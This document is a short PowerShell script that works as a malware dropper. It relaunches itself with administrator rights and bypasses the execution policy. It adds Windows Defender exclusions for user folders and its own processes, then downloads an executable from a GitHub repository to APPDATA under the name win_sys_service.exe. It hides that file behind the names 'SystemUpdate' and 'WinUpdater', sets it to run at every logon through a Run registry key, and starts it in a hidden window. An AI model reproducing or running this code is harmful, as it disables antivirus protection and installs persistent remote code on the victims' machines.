if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"") -Verb RunAs
    exit
}

$u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
$o = "$env:APPDATA\win_sys_service.exe"

Add-MpPreference -ExclusionPath "C:\ProgramData", "C:\Users" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "powershell.exe", "win_sys_service.exe", "SystemUpdate.exe" -ErrorAction SilentlyContinue

Start-Sleep -Seconds 5

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($u, $o)
    Unblock-File -Path "$o" -ErrorAction SilentlyContinue
    
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$o`"" -ErrorAction SilentlyContinue

    Start-Process -FilePath "$o" -WindowStyle Hidden -ErrorAction SilentlyContinue
} catch {}
